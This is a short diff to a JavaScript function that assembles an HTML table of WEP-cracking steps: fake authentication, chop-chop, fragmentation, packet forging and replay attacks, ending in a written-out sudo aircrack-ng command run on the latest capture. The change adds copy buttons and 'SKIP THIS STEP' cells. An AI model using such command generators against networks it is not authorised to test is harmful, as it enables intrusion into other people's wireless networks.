@@ -223,8 +223,8 @@ function myFunction() {
 		+ '<tr><td colspan="3">' + fakeAuth(ssid, apMac, mac, deviceName) + postamble()
 		+ preamble() + chopChopAttack(apMac, mac, deviceName) + copyButton() + "</td><td>" + fragmentationAttack(apMac, mac, deviceName)
 		 + copyButton() + "</td><td>" + replayAnyAttack(apMac, mac, deviceName) + postamble()   
-		+ '<tr><td colspan="2">' + packetForge(apMac, mac, deviceName) + postamble() 
-		+ '<tr><td colspan="2">' + replayAttack(deviceName) + postamble()               
+		+ '<tr><td colspan="2">' + packetForge(apMac, mac, deviceName) + copyButton() + "</td><td>SKIP THIS STEP</tr></td>"
+		+ '<tr><td colspan="2">' + replayAttack(deviceName) + copyButton() + "</td><td>SKIP THIS STEP"        
 		+ preamble() + sudo() + "aircrack-ng `ls -t "+ssid+"*.cap | head -1`" + postamble()
 		+ "</table>";
 		
